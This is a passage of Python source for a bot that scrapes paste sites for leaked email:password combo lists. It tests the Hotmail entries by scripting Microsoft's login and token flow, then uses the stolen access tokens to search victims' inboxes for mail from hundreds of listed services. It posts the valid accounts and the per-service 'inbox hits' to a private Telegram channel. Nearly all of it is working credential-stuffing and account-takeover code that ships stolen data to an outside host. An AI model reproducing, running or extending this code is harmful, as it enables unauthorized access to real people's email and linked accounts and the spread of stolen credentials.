    "TCGPlayer": "noreply@tcgplayer.com",
    "StockX": "noreply@stockx.com",
    "GOAT": "noreply@goat.com",
    "Reverb": "noreply@reverb.com",
    "Discogs": "noreply@discogs.com",
    "Bandcamp": "noreply@bandcamp.com",
    
    # Books & Reading
    "Goodreads": "noreply@goodreads.com",
    "Book of the Month": "noreply@bookofthemonth.com",
    "Scribd": "noreply@scribd.com",
    "Kobo": "noreply@kobo.com",
    "Barnes & Noble": "noreply@barnesandnoble.com",
    "Book Depository": "noreply@bookdepository.com",
    "ThriftBooks": "noreply@thriftbooks.com",
    "Better World Books": "noreply@betterworldbooks.com",
    "Libby": "noreply@overdrive.com",
    "Hoopla": "noreply@hoopladigital.com",
    
    # Messaging & Chat
    "Facebook Messenger": "notification@facebookmail.com",
    "WhatsApp Business": "noreply@whatsapp.com",
    "Telegram Business": "noreply@telegram.org",
    "Line": "noreply@line.me",
    "KakaoTalk": "noreply@kakaocorp.com",
    "Skype": "noreply@skype.com",
    "Google Chat": "noreply@google.com",
    "Rocket.Chat": "noreply@rocket.chat",
    "Mattermost": "noreply@mattermost.com",
    "Element": "noreply@element.io",
    
    # Video Conferencing
    "GoToMeeting": "noreply@gotomeeting.com",
    "BlueJeans": "noreply@bluejeans.com",
    "Whereby": "noreply@whereby.com",
    "Around": "noreply@around.co",
    "Mmhmm": "noreply@mmhmm.app",
    
    # Social Commerce
    "Poshmark": "noreply@poshmark.com",
    "Mercari": "noreply@mercari.com",
    "Depop": "noreply@depop.com",
    "Vinted": "noreply@vinted.com",
    "Vestiaire Collective": "noreply@vestiairecollective.com",
    "Grailed": "noreply@grailed.com",
    "ThredUp": "noreply@thredup.com",
    "The RealReal": "noreply@therealreal.com",
    
    # Crowdfunding
    "Kickstarter": "noreply@kickstarter.com",
    "Indiegogo": "noreply@indiegogo.com",
    "GoFundMe": "noreply@gofundme.com",
    "Patreon": "noreply@patreon.com",
    "Buy Me a Coffee": "noreply@buymeacoffee.com",
    "GitHub Sponsors": "noreply@github.com",
    "Open Collective": "noreply@opencollective.com",
    
    # Freelance & Gig
    "Upwork": "noreply@upwork.com",
    "Fiverr": "noreply@fiverr.com",
    "Freelancer": "noreply@freelancer.com",
    "Toptal": "noreply@toptal.com",
    "Guru": "noreply@guru.com",
    "PeoplePerHour": "noreply@peopleperhour.com",
    "99designs": "noreply@99designs.com",
    "DesignCrowd": "noreply@designcrowd.com",
    "Dribbble": "noreply@dribbble.com",
    "Behance": "noreply@behance.net",
    
    # Code Learning
    "freeCodeCamp": "noreply@freecodecamp.org",
    "LeetCode": "noreply@leetcode.com",
    "HackerRank": "noreply@hackerrank.com",
    "Codewars": "noreply@codewars.com",
    "Exercism": "noreply@exercism.io",
    "Coderbyte": "noreply@coderbyte.com",
    "CodeSignal": "noreply@codesignal.com",
    "TopCoder": "noreply@topcoder.com",
    "Codeforces": "noreply@codeforces.com",
    
    # Business Services
    "Gusto": "noreply@gusto.com",
    "Rippling": "noreply@rippling.com",
    "Carta": "noreply@carta.com",
    "AngelList Venture": "noreply@angellist.com",
    "Gust": "noreply@gust.com",
    "Stripe Atlas": "noreply@stripe.com",
    "Clerky": "noreply@clerky.com",
    "Foundersuite": "noreply@foundersuite.com",
    
    # API Services
    "Twilio": "noreply@twilio.com",
    "SendGrid": "noreply@sendgrid.com",
    "Mailgun": "noreply@mailgun.com",
    "Postmark": "noreply@postmarkapp.com",
    "Plaid": "noreply@plaid.com",
    "Algolia": "noreply@algolia.com",
    "Auth0": "noreply@auth0.com",
    "Okta": "noreply@okta.com",
    "OneLogin": "noreply@onelogin.com",
    
    # IoT & Smart Home
    "Philips Hue": "noreply@philips.com",
    "LIFX": "noreply@lifx.com",
    "Nest": "noreply@nest.com",
    "Ring": "noreply@ring.com",
    "Arlo": "noreply@arlo.com",
    "Wyze": "noreply@wyze.com",
    "TP-Link": "noreply@tp-link.com",
    "SmartThings": "noreply@smartthings.com",
    "IFTTT": "noreply@ifttt.com",
    "Home Assistant": "noreply@home-assistant.io",
    
    # Weather & Environment
    "Weather Underground": "noreply@wunderground.com",
    "Weather.com": "noreply@weather.com",
    "AccuWeather": "noreply@accuweather.com",
    "Dark Sky": "noreply@darksky.net",
    "Weatherbug": "noreply@weatherbug.com",
    
    # Music Production
    "Splice": "noreply@splice.com",
    "Landr": "noreply@landr.com",
    "BandLab": "noreply@bandlab.com",
    "DistroKid": "noreply@distrokid.com",
    "TuneCore": "noreply@tunecore.com",
    "CD Baby": "noreply@cdbaby.com",
    
    # Stock Trading
    "E*TRADE": "noreply@etrade.com",
    "TD Ameritrade": "noreply@tdameritrade.com",
    "Charles Schwab": "noreply@schwab.com",
    "Fidelity": "noreply@fidelity.com",
    "Interactive Brokers": "noreply@interactivebrokers.com",
    "Webull": "noreply@webull.com",
    "M1 Finance": "noreply@m1finance.com",
    "Public": "noreply@public.com",
    "Acorns": "noreply@acorns.com",
    "Betterment": "noreply@betterment.com",
    "Wealthfront": "noreply@wealthfront.com",
    "Stash": "noreply@stash.com",
    
    # Genealogy
    "Ancestry": "noreply@ancestry.com",
    "23andMe": "noreply@23andme.com",
    "MyHeritage": "noreply@myheritage.com",
    "FamilySearch": "noreply@familysearch.org",
    "Findmypast": "noreply@findmypast.com",
    
    # Language & Translation
    "DeepL": "noreply@deepl.com",
    "Google Translate": "noreply@google.com",
    "Microsoft Translator": "noreply@microsoft.com",
    "Reverso": "noreply@reverso.net",
    "Linguee": "noreply@linguee.com",
    
    # Calendar & Scheduling
    "Doodle": "noreply@doodle.com",
    "When2Meet": "noreply@when2meet.com",
    "Acuity Scheduling": "noreply@acuityscheduling.com",
    "SimplyBook": "noreply@simplybook.me",
    "Setmore": "noreply@setmore.com",
    "Square Appointments": "noreply@squareup.com",
    
    # Forms & Surveys
    "Google Forms": "noreply@google.com",
    "Typeform": "noreply@typeform.com",
    "SurveyMonkey": "noreply@surveymonkey.com",
    "Jotform": "noreply@jotform.com",
    "Formstack": "noreply@formstack.com",
    "Wufoo": "noreply@wufoo.com",
    "Paperform": "noreply@paperform.co",
    "Tally": "noreply@tally.so",
    
    # Whiteboard & Collaboration
    "Miro": "noreply@miro.com",
    "Mural": "noreply@mural.co",
    "Lucidchart": "noreply@lucidchart.com",
    "Draw.io": "noreply@diagrams.net",
    "Excalidraw": "noreply@excalidraw.com",
    "FigJam": "noreply@figma.com",
    
    # Notes & Wiki
    "Bear": "noreply@bear.app",
    "Obsidian": "noreply@obsidian.md",
    "Roam Research": "noreply@roamresearch.com",
    "Logseq": "noreply@logseq.com",
    "RemNote": "noreply@remnote.com",
    "Mem": "noreply@mem.ai",
    "Craft": "noreply@craft.do",
    "Notability": "noreply@gingerlabs.com",
    "GoodNotes": "noreply@goodnotes.com",
    
    # Screenshot & Screen Recording
    "CloudApp": "noreply@getcloudapp.com",
    "Droplr": "noreply@droplr.com",
    "Monosnap": "noreply@monosnap.com",
    "Lightshot": "noreply@lightshot.com",
    "Snagit": "noreply@techsmith.com",
    "Camtasia": "noreply@techsmith.com",
    "ScreenFlow": "noreply@telestream.net",
    "OBS Studio": "noreply@obsproject.com",
    
    # Browser Extensions & Tools
    "Grammarly": "noreply@grammarly.com",
    "Honey": "noreply@joinhoney.com",
    "Rakuten": "noreply@rakuten.com",
    "Pocket": "noreply@getpocket.com",
    "Instapaper": "noreply@instapaper.com",
    "RescueTime": "noreply@rescuetime.com",
    "Toggl": "noreply@toggl.com",
    "Clockify": "noreply@clockify.me",
    "Harvest": "noreply@harvestapp.com",
    
    # Mobile Apps
    "Calm": "noreply@calm.com",
    "Headspace": "noreply@headspace.com",
    "Insight Timer": "noreply@insighttimer.com",
    "Waking Up": "noreply@wakingup.com",
    "Ten Percent Happier": "noreply@tenpercent.com",
    "Forest": "noreply@forestapp.cc",
    "Habitica": "noreply@habitica.com",
    "Streaks": "noreply@streaksapp.com",
    "Way of Life": "noreply@wayoflifeapp.com",
    
    # RSS & Feed Readers
    "Feedly": "noreply@feedly.com",
    "Inoreader": "noreply@inoreader.com",
    "NewsBlur": "noreply@newsblur.com",
    "The Old Reader": "noreply@theoldreader.com",
    "Feedbin": "noreply@feedbin.com",
    
    # Backup & Sync
    "Backblaze": "noreply@backblaze.com",
    "Carbonite": "noreply@carbonite.com",
    "IDrive": "noreply@idrive.com",
    "CrashPlan": "noreply@crashplan.com",
    "Sync.com": "noreply@sync.com",
    "Tresorit": "noreply@tresorit.com",
    
    # Password Managers (Additional)
    "NordPass": "noreply@nordpass.com",
    "RoboForm": "noreply@roboform.com",
    "Sticky Password": "noreply@stickypassword.com",
    "Enpass": "noreply@enpass.io",
    
    # Regional Services - Europe
    "Klarna": "noreply@klarna.com",
    "Afterpay": "noreply@afterpay.com",
    "Sezzle": "noreply@sezzle.com",
    "Affirm": "noreply@affirm.com",
    "Clearpay": "noreply@clearpay.co.uk",
    "Monzo": "noreply@monzo.com",
    "Starling Bank": "noreply@starlingbank.com",
    "Transferwise": "noreply@wise.com",
    "Curve": "noreply@curve.com",
    "Bolt": "noreply@bolt.eu",
    "Deliveroo": "noreply@deliveroo.com",
    "Just Eat": "noreply@just-eat.com",
    "Glovo": "noreply@glovoapp.com",
    "Wolt": "noreply@wolt.com",
    
    # Regional Services - Asia
    "Grab": "noreply@grab.com",
    "Gojek": "noreply@gojek.com",
    "Paytm": "noreply@paytm.com",
    "PhonePe": "noreply@phonepe.com",
    "Alipay": "noreply@alipay.com",
    "WeChat Pay": "noreply@wechatpay.com",
    "Line Pay": "noreply@linepay.com",
    "Rakuten": "noreply@rakuten.co.jp",
    "Mercado Libre": "noreply@mercadolibre.com",
    "Shopee": "noreply@shopee.com",
    "Lazada": "noreply@lazada.com",
    "Tokopedia": "noreply@tokopedia.com",
    "Bukalapak": "noreply@bukalapak.com",
    
    # Regional Services - Latin America
    "Rappi": "noreply@rappi.com",
    "Cornershop": "noreply@cornershopapp.com",
    "iFood": "noreply@ifood.com.br",
    "Nubank": "noreply@nubank.com.br",
    "Inter": "noreply@bancointer.com.br",
    "PicPay": "noreply@picpay.com",
    "Mercado Pago": "noreply@mercadopago.com",
    
    # Additional Tech & SaaS
    "Zapier": "noreply@zapier.com",
    "Make": "noreply@make.com",
    "n8n": "noreply@n8n.io",
    "Integromat": "noreply@integromat.com",
    "Automate.io": "noreply@automate.io",
    "Tray.io": "noreply@tray.io",
    "Workato": "noreply@workato.com",
    "Retool": "noreply@retool.com",
    "Bubble": "noreply@bubble.io",
    "Webflow": "noreply@webflow.com",
    "Framer": "noreply@framer.com",
    "Carrd": "noreply@carrd.co",
    "Notion": "team@makenotion.com",
    "Coda": "noreply@coda.io",
    
    # Additional Productivity
    "Todoist": "noreply@todoist.com",
    "Things": "noreply@culturedcode.com",
    "OmniFocus": "noreply@omnigroup.com",
    "Any.do": "noreply@any.do",
    "Microsoft To Do": "noreply@microsoft.com",
    "TickTick": "noreply@ticktick.com",
    "Remember The Milk": "noreply@rememberthemilk.com",
    
    # Video Editing
    "Final Cut Pro": "noreply@apple.com",
    "DaVinci Resolve": "noreply@blackmagicdesign.com",
    "Premiere Pro": "noreply@adobe.com",
    "After Effects": "noreply@adobe.com",
    "Kapwing": "noreply@kapwing.com",
    "InVideo": "noreply@invideo.io",
    "Animoto": "noreply@animoto.com",
    "VEED": "noreply@veed.io",
    "Clipchamp": "noreply@clipchamp.com",
    
    # 3D & CAD
    "Blender": "noreply@blender.org",
    "SketchUp": "noreply@sketchup.com",
    "AutoCAD": "noreply@autodesk.com",
    "Fusion 360": "noreply@autodesk.com",
    "Tinkercad": "noreply@tinkercad.com",
    "Onshape": "noreply@onshape.com",
    "SolidWorks": "noreply@solidworks.com",
    "Rhino": "noreply@rhino3d.com",
    "Cinema 4D": "noreply@maxon.net",
    
    # Audio & Podcasting
    "Anchor": "noreply@anchor.fm",
    "Buzzsprout": "noreply@buzzsprout.com",
    "Libsyn": "noreply@libsyn.com",
    "Podbean": "noreply@podbean.com",
    "Transistor": "noreply@transistor.fm",
    "Simplecast": "noreply@simplecast.com",
    "Captivate": "noreply@captivate.fm",
    "Auphonic": "noreply@auphonic.com",
    
    # SEO & Marketing Tools
    "Ahrefs": "noreply@ahrefs.com",
    "SEMrush": "noreply@semrush.com",
    "Moz": "noreply@moz.com",
    "Screaming Frog": "noreply@screamingfrog.co.uk",
    "Google Search Console": "noreply@google.com",
    "Yoast": "noreply@yoast.com",
    "Rank Math": "noreply@rankmath.com",
    
    # Social Media Management
    "Buffer": "noreply@buffer.com",
    "Hootsuite": "noreply@hootsuite.com",
    "Later": "noreply@later.com",
    "Sprout Social": "noreply@sproutsocial.com",
    "SocialBee": "noreply@socialbee.io",
    "Planoly": "noreply@planoly.com",
    "CoSchedule": "noreply@coschedule.com",
    "Sendible": "noreply@sendible.com",
    
    # Live Streaming
    "StreamYard": "noreply@streamyard.com",
    "Restream": "noreply@restream.io",
    "OBS": "noreply@obsproject.com",
    "vMix": "noreply@vmix.com",
    "Streamlabs": "noreply@streamlabs.com",
    
    # Additional Services
    "Calendly": "noreply@calendly.com",
    "Acuity": "noreply@acuityscheduling.com",
    "Appointlet": "noreply@appointlet.com",
    "YouCanBook.me": "noreply@youcanbook.me",
    "Book Like A Boss": "noreply@booklikeaboss.com",
    "TidyCal": "noreply@tidycal.com",
    "SavvyCal": "noreply@savvycal.com",
    "Cal.com": "noreply@cal.com",
    "Fantastical": "noreply@flexibits.com",
    "Cron": "noreply@cron.com",
}

def check_inbox_account(combo: str) -> tuple:
    """Login to hotmail and check inbox for service emails. Returns (combo, hits_dict)."""
    import requests, re, uuid, time
    try:
        email, password = combo.split(":", 1)
        session = requests.Session()

        # Step 1 - verify MSAccount
        r1 = session.get(
            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
            headers={
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }, timeout=15)
        if "MSAccount" not in r1.text:
            return (combo, {})

        time.sleep(0.3)

        # Step 2 - get login page
        r2 = session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
            allow_redirects=True, timeout=15)

        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return (combo, {})

        post_url = url_match.group(1).replace("\\/", "/")
        ppft     = ppft_match.group(1)

        # Step 3 - login
        r3 = session.post(post_url,
            data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }, allow_redirects=False, timeout=15)

        if any(x in r3.text for x in ["account or password is incorrect", "Incorrect password", "Invalid credentials", "identity/confirm", "Abuse", "signedout", "locked"]):
            return (combo, {})

        location   = r3.headers.get("Location", "")
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return (combo, {})

        # Step 4 - get access token
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
            data={
                "client_info": "1",
                "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                "grant_type": "authorization_code",
                "code": code_match.group(1),
                "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
            }, timeout=15)

        if r4.status_code != 200 or "access_token" not in r4.text:
            return (combo, {})

        access_token = r4.json()["access_token"]
        mspcid = next((c.value for c in session.cookies if c.name == "MSPCID"), str(uuid.uuid4()))
        cid = mspcid.upper()

        # Step 5 - search inbox for each service
        hits = {}
        for service_name, sender in INBOX_SERVICES.items():
            try:
                r = requests.post(
                    "https://outlook.live.com/search/api/v2/query",
                    json={"Cvid": str(uuid.uuid4()), "Scenario": {"Name": "owa.react"}, "TimeZone": "UTC",
                          "TextDecorations": "Off",
                          "EntityRequests": [{"EntityType": "Conversation", "ContentSources": ["Exchange"],
                                              "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                                              "From": 0, "Query": {"QueryString": f"from:{sender}"},
                                              "Size": 1, "Sort": [{"Field": "Time", "SortDirection": "Desc"}]}]},
                    headers={"Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}", "Content-Type": "application/json"},
                    timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    try:
                        total = data["EntitySets"][0]["ResultSets"][0].get("Total", 0)
                        if total > 0:
                            hits[service_name] = total
                    except Exception:
                        pass
                time.sleep(0.1)
            except Exception:
                continue

        return (combo, hits)

    except Exception:
        return (combo, {})


def check_valid_account(combo: str) -> tuple:
    """Check if hotmail account is valid. Returns (combo, True/False)."""
    import requests, re, uuid, time
    try:
        email, password = combo.split(":", 1)
        session = requests.Session()

        r1 = session.get(
            f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}",
            headers={
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": str(uuid.uuid4()),
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }, timeout=15)
        if "MSAccount" not in r1.text:
            return (combo, False)

        time.sleep(0.3)

        r2 = session.get(
            f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D",
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
            allow_redirects=True, timeout=15)

        url_match  = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match:
            return (combo, False)

        post_url = url_match.group(1).replace("\\/", "/")
        ppft     = ppft_match.group(1)

        r3 = session.post(post_url,
            data=f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960",
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }, allow_redirects=False, timeout=15)

        if any(x in r3.text for x in ["account or password is incorrect", "Incorrect password", "Invalid credentials", "identity/confirm", "Abuse", "signedout", "locked"]):
            return (combo, False)

        location   = r3.headers.get("Location", "")
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match:
            return (combo, False)

        return (combo, True)

    except Exception:
        return (combo, False)


async def run_validity_checker(combos: list) -> list:
    """Check which accounts are valid. Returns list of valid combos."""
    log.info(f"Checking validity of {len(combos)} hotmail accounts...")
    loop = asyncio.get_event_loop()
    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
        futures = [loop.run_in_executor(pool, check_valid_account, combo) for combo in combos]
        results = await asyncio.gather(*futures)
    valid = [combo for combo, is_valid in results if is_valid]
    log.info(f"Validity check done — {len(valid)}/{len(combos)} valid")
    return valid


async def run_inbox_checker(combos: list) -> dict:
    """Run inbox checker on all combos. Returns dict of service -> list of combos."""
    log.info(f"Running inbox checker on {len(combos)} combos...")
    loop = asyncio.get_event_loop()
    service_map = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=CHECKER_THREADS) as pool:
        futures = [loop.run_in_executor(pool, check_inbox_account, combo) for combo in combos]
        results = await asyncio.gather(*futures)
    for combo, hits in results:
        for service in hits:
            service_map.setdefault(service, []).append(combo)
    log.info(f"Inbox check done — hits in {len(service_map)} service(s): {list(service_map.keys())}")
    return service_map


# ─── PASTED.PW ───────────────────────────────────────────────────────────────
async def scrape_pastedpw(pages: int = 5) -> list[dict]:
    """Scrape pasted.pw recent page using aiohttp."""
    found = []
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
    async with aiohttp.ClientSession(headers=headers) as sess:
        for page_num in range(1, pages + 1):
            url = PASTEDPW_URL if page_num == 1 else f"{PASTEDPW_URL}?page={page_num}"
            try:
                async with sess.get(url, timeout=aiohttp.ClientTimeout(total=15)) as r:
                    html = await r.text(errors="ignore")
                # Extract paste IDs and titles from anchor tags
                matches = re.findall(r'href="view\.php\?id=(\d+)"[^>]*>\s*([^<]+?)\s*</a>', html)
                for paste_id, title in matches:
                    title = title.strip()
                    if any(k in title.lower() for k in KEYWORDS):
                        if not any(b in title.lower() for b in BLACKLIST):
                            found.append({
                                "title": title,
                                "url": f"https://pasted.pw/view.php?id={paste_id}",
                                "source": "pasted.pw"
                            })
                log.info(f"pasted.pw page {page_num}: {len(found)} match(es) so far")
            except Exception as e:
                log.error(f"pasted.pw page {page_num} failed: {e}")
    return found


async def extract_pastedpw(page, url: str) -> str:
    """Extract combo text from a pasted.pw paste page."""
    for attempt in range(2):
        try:
            await page.goto(url, wait_until="domcontentloaded", timeout=20000)
            await page.wait_for_timeout(1500)
            # Try getting text from the paste content area
            raw = await page.evaluate("""
                () => {
                    const pre = document.querySelector('pre');
                    if (pre) return pre.innerText;
                    const ta = document.querySelector('textarea');
                    if (ta) return ta.value;
                    const div = document.querySelector('.paste-content');
                    if (div) return div.innerText;
                    return null;
                }
            """)
            if raw and raw.strip():
                return raw
        except Exception as e:
            log.error(f"pasted.pw extract attempt {attempt+1} failed for {url}: {e}")
            if attempt == 0:
                await asyncio.sleep(2)
    return ""


# ─── BACKGROUND TASK ─────────────────────────────────────────────────────────
@tasks.loop(seconds=CHECK_INTERVAL)
async def monitor_loop():
    if not toggles["scanning"]:
        return

    if scan_lock.locked():
        log.info("Scan already in progress, skipping this cycle")
        return

    async with scan_lock:
        stats["scans"] += 1
        log.info(f"Running scan #{stats['scans']}...")

        async with async_playwright() as p:
            browser = await p.chromium.launch(
                headless=True,
                args=["--no-sandbox", "--disable-setuid-sandbox", "--disable-dev-shm-usage"]
            )
            page = await browser.new_page()

            try:
                # ── Step 1: load archive ───────────────────────────────────
                for attempt in range(3):
                    try:
                        await page.goto(ARCHIVE_URL, wait_until="networkidle", timeout=30000)
                        await page.wait_for_timeout(2000)
                        break
                    except Exception as e:
                        log.warning(f"Archive load attempt {attempt+1} failed: {e}")
                        if attempt == 2:
                            log.error("Archive failed after 3 attempts, skipping scan")
                            return
                        await asyncio.sleep(3)

                # ── Step 2: scrape pages ───────────────────────────────────
                found = []
                for page_num in range(1, PAGES_TO_SCAN + 1):
                    if page_num > 1:
                        navigated = False
                        buttons   = await page.query_selector_all("button")
                        for btn in buttons:
                            text = await btn.text_content()
                            if text and text.strip().lower() in ["next", ">", "»", "→", "▶"]:
                                disabled  = await btn.get_attribute("disabled")
                                aria_dis  = await btn.get_attribute("aria-disabled")
                                if disabled is not None or aria_dis == "true":
                                    break
                                await btn.click()
                                await page.wait_for_timeout(2000)
                                navigated = True
                                break
                        if not navigated:
                            break

                    matches = await page.evaluate("""
                        (keywords) => {
                            const results = [];
                            for (const a of document.querySelectorAll('a')) {
                                const text = (a.innerText || a.textContent || '').toLowerCase();
                                if (keywords.some(k => text.includes(k))) {
                                    const href = a.href;
                                    if (href
                                        && !href.includes('/paste-archive')
                                        && !href.includes('/new')
                                        && !href.endsWith('/')
                                        && href !== window.location.href) {
                                        results.push({
                                            title: (a.innerText || a.textContent || '').trim().replace(/\\s+/g, ' '),
                                            url: href,
                                            source: 'pasteview'
                                        });
                                    }
                                }
                            }
                            return results;
                        }
                    """, KEYWORDS)
                    log.info(f"Page {page_num}: {len(matches)} match(es)")
                    found.extend(matches)

                # ── Also scrape pasted.pw ─────────────────────────────
                try:
                    pw_found = await scrape_pastedpw(PAGES_TO_SCAN)
                    found.extend(pw_found)
                except Exception as e:
                    log.error(f"pasted.pw scrape failed: {e}")

                # Deduplicate and filter blacklisted titles
                seen_this_run = set()
                pastes        = []
                for item in found:
                    if item["url"] in seen_this_run:
                        continue
                    if any(b in item["title"].lower() for b in BLACKLIST):
                        log.info(f"Skipping blacklisted paste: {item['title']}")
                        continue
                    seen_this_run.add(item["url"])
                    # Ensure source field is preserved
                    if "source" not in item:
                        item["source"] = "pasteview"
                    pastes.append(item)

                stats["total_pastes"] += len(pastes)
                pv_count = sum(1 for p in pastes if p.get("source") == "pasteview")
                pw_count = sum(1 for p in pastes if p.get("source") == "pasted.pw")
                log.info(f"Total pastes: {len(pastes)} (pasteview: {pv_count}, pasted.pw: {pw_count})")

                # ── Step 4: filter new pastes & mark seen ─────────────────
                new_pastes = [p for p in pastes if p["url"] not in posted_urls]
                if not new_pastes:
                    stats["empty_scans"] += 1
                    log.info(f"No new pastes (empty streak: {stats['empty_scans']})")
                    if stats["empty_scans"] == EMPTY_SCAN_ALERT:
                        try:
                            owner = await bot.fetch_user(OWNER_ID)
                            await owner.send(f"⚠️ MERCURY: No new pastes in {EMPTY_SCAN_ALERT} consecutive scans.")
                        except Exception as e:
                            log.error(f"Failed to DM owner: {e}")
                    return

                stats["empty_scans"] = 0
                for p in new_pastes:
                    posted_urls.add(p["url"])
                save_seen(posted_urls)
                log.info(f"{len(new_pastes)} new paste(s) detected")

                # ── Step 6: extract creds & post to channel 3 ─────────────
                try:
                    combined        = []

                    for item in new_pastes[:5]:
                        url = item["url"]
                        log.info(f"Extracting from {url}")
                        if item.get("source") == "pasted.pw":
                            raw = await extract_pastedpw(page, url)
                        else:
                            raw = await extract_raw(page, url)
                        if raw:
                            creds = extract_credentials(raw)
                            if creds:
                                combined.append("\n".join(creds))
                                stats["total_combos"] += len(creds)
                                log.info(f"✓ {len(creds)} valid combos from {url}")
                            else:
                                log.info(f"No valid combos in {url}")
                        else:
                            log.info(f"No content extracted from {url}")


                    if combined:
                        # Flatten all creds
                        all_raw = [l for b in combined for l in b.splitlines() if l.strip()]
                        random.shuffle(all_raw)

                        # Determine label
                        title_lower_check = " ".join(p["title"].lower() for p in new_pastes)
                        if "hotmail" in title_lower_check:
                            label = "hotmail"
                        elif "hits" in title_lower_check:
                            label = "hits"
                        elif "mix" in title_lower_check or "mixed" in title_lower_check:
                            label = "mix"
                        else:
                            label = "content"



                        chunks = [all_raw]
                        log.info(f"{len(all_raw)} combos in 1 file")

                    if combined:
                        # DM owner
                        if toggles["owner_dm"]:
                            try:
                                owner = await bot.fetch_user(OWNER_ID)
                                await owner.send(f"✅ New {label.upper()} detected — {len(all_raw)} combos")
                            except Exception as e:
                                log.error(f"Failed to DM owner: {e}")

                        # Telegram — post all chunks
                        if toggles["telegram"]:
                            tg_header = (
                                f"WAR CLOUD PRIVATE {label.upper()}\n"
                                "------------------------\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n"
                                "https://t.me/+5Bqqamk3cpcxNDA0\n\n"
                            )
                            for chunk in chunks:
                                fname = f"[ {label.upper()} ] [ {len(chunk)} ] [ @warprivate ].txt"
                                await send_telegram_file(tg_header + "\n".join(chunk), fname)
                                await asyncio.sleep(0.5)

                            # Validity check + inbox checker (hotmail only)
                            if label == "hotmail":
                                try:
                                    # First check which accounts are valid
                                    valid_accounts = await run_validity_checker(all_raw)
                                    if valid_accounts:
                                        # Replace all_raw with only valid accounts
                                        all_raw = valid_accounts
                                        combined = ["\n".join(all_raw)]
                                        chunks = [all_raw]
                                        # Re-post main file with valid only
                                        valid_fname = f"[ HOTMAIL ] [ {len(all_raw)} ] [ VALID ] [ @warprivate ].txt"
                                        await send_telegram_file(tg_header + "\n".join(all_raw), valid_fname)
                                        log.info(f"Posted {len(all_raw)} valid hotmail accounts")
                                    else:
                                        log.info("No valid hotmail accounts found")

                                    # Then run inbox checker on valid accounts only
                                    service_map = await run_inbox_checker(valid_accounts if valid_accounts else all_raw)
                                    if service_map:
                                        zip_buf = io.BytesIO()
                                        with zipfile.ZipFile(zip_buf, "w", zipfile.ZIP_DEFLATED) as zf:
                                            for service, combos in service_map.items():
                                                zf.writestr(f"{service}.txt", "\n".join(combos))
                                        zip_buf.seek(0)
                                        zip_name = f"[ {label.upper()} ] [ INBOX HITS ] [ @warprivate ].zip"
                                        await send_telegram_file(zip_buf.read(), zip_name)
